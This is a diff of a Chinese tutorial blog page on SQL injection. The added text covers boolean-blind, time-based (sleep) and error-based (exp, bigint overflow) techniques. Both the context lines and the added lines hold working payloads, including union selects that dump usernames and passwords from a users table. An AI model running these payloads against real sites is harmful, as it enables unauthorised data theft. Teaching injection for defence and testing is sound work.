@@ -17,7 +17,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http:&#x2F;&#x2F;www.f4guo.top&#x2F;images&#x2F;paperimage&#x2F;sql2_1.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;www.f4guo.top&#x2F;images&#x2F;paperimage&#x2F;ASCII.jpg">
-<meta property="og:updated_time" content="2019-03-22T15:11:38.585Z">
+<meta property="og:updated_time" content="2020-04-09T06:55:58.084Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;www.f4guo.top&#x2F;images&#x2F;paperimage&#x2F;sql2_1.png">
 
@@ -146,7 +146,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    6 分钟 读完 (大约 825 个字)
+                    9 分钟 读完 (大约 1389 个字)
                 </span>
                 
             </div>
@@ -185,7 +185,13 @@
 &apos; union select 1,group_concat(username),3 from users --+
 &apos; union select 1,group_concat(password),3 from users --+
 &apos; union select 1,group_concat(username),group_concat(password) from users --+</code></pre><p>以上测试语句是基于字符型的注入</p>
-<h3 id="0x03-高阶注入"><a href="#0x03-高阶注入" class="headerlink" title="0x03 高阶注入"></a>0x03 高阶注入</h3><h4 id="基于布尔型盲注"><a href="#基于布尔型盲注" class="headerlink" title="基于布尔型盲注"></a>基于布尔型盲注</h4><p>获取数据库名称长度</p>
+<h3 id="0x03-高阶注入"><a href="#0x03-高阶注入" class="headerlink" title="0x03 高阶注入"></a>0x03 高阶注入</h3><h4 id="基于布尔型盲注"><a href="#基于布尔型盲注" class="headerlink" title="基于布尔型盲注"></a>基于布尔型盲注</h4><pre><code>left(database(),1)&gt;&apos;s&apos; :    database()显示数据库名称，left(a,b)从a的左侧截取前b位
+substr(a,b,c) :                 从 b 位置开始， 截取字符串 a 的 c 长度
+mid(a,b,c) :                    从位置 b 开始， 截取 a 字符串的 c 位
+ascii():                            将某个字符转换为ascii值
+ord():                             同 ascii()， 将字符转为 ascii 值
+like 匹配注入:                 select user() like ‘ro%’
+正则匹配注入:                 select user() regexp &apos;^ro&apos;; 正则表达式的用法， user()结果为 root， regexp 为匹配 root 的正则表达式</code></pre><p>获取数据库名称长度</p>
 <pre><code>&apos; and (length(database())) = 1 --+
 &apos; and (length(database())) = 2 --+
 &apos; and (length(database())) = 3 --+
@@ -193,12 +199,33 @@
 <pre><code>&apos; and (ascii(substr((select database()),1,1))) &gt; 100 --+
 &apos; and (ascii(substr((select database()),1,1))) &lt; 150 --+
 ...</code></pre><p><img src="/images/paperimage/ASCII.jpg" alt="来源:www.charstable.com"></p>
-<h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>mid(database(),m,n):返回数据库名的第m位之后的n位</p>
+<h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><pre><code>延时注入                      sleep()
+
+benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。
+benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式
+
+heavy query 通过大量查询导致查询时间较长来达到延时的目的
+
+CAST()函数用于将某种数据类型的表达式显式转换为另一种数据类型。CAST()函数的参数是一个表达式，它包括用AS关键字分隔的源值和目标数据类型。
+
+语法：CAST (expression AS data_type)
+expression：任何有效的SQServer表达式。
+AS：用于分隔两个参数，在AS之前的是要处理的数据，在AS之后是要转换的数据类型。
+data_type：目标系统所提供的数据类型，包括bigint和sql_variant，不能使用用户定义的数据类型。</code></pre><p>mid(database(),m,n):返回数据库名的第m位之后的n位</p>
 <pre><code>如果数据库名称中的第二位为b,就会延时5秒返回结果
 &apos; and if((mid(database(),2,1)=98),sleep(5),0)
 如果数据库名称中的第二位为c,就会延时100秒返回结果
 &apos; and if((mid(database(),2,1)=99),sleep(100),0)
-...</code></pre><h4 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h4><p>一次注入的恶意数据被存入了数据库，然后再次利用第一次存入数据库中的恶意数据进行第二次注入攻击。</p>
+...</code></pre><h4 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h4><pre><code>round():                        遵循四舍五入把原值转化为指定小数位数。如：round(1.45,0) = 1;round(1.55,0)=2
+ceiling():                        向上舍入为指定小数位数.如：ceiling(1.45,0) = 2;ceiling(1.55,0)=2
+floor():                           向下舍入为指定小数位数.如：floor(1.45,0)= 1;floor(1.55,0) = 1
+rand():                           返回一个介于0和1之间的随机数，float类型，开区间 
+
+group by分组后数据计数时重复造成的错误
+double 数值类型超出范围          select exp(~(select * FROM(SELECT USER())a))       //Exp()为以 e 为底的对数函数； 版本在 5.5.5 及其以上
+bigint 超出范围                         select !(select * from (select user())x) -（ps:这是减号） ~0     //~0 是对 0 逐位取反， 很大的版本在 5.5.5 及其以上
+xpath 错误
+mysql 重复特性</code></pre><h4 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h4><p>一次注入的恶意数据被存入了数据库，然后再次利用第一次存入数据库中的恶意数据进行第二次注入攻击。</p>
 <hr>
 <p>参考：<a href="https://bbs.pediy.com/thread-218235.htm" target="_blank" rel="noopener">SQL注入新手教程</a></p>
 
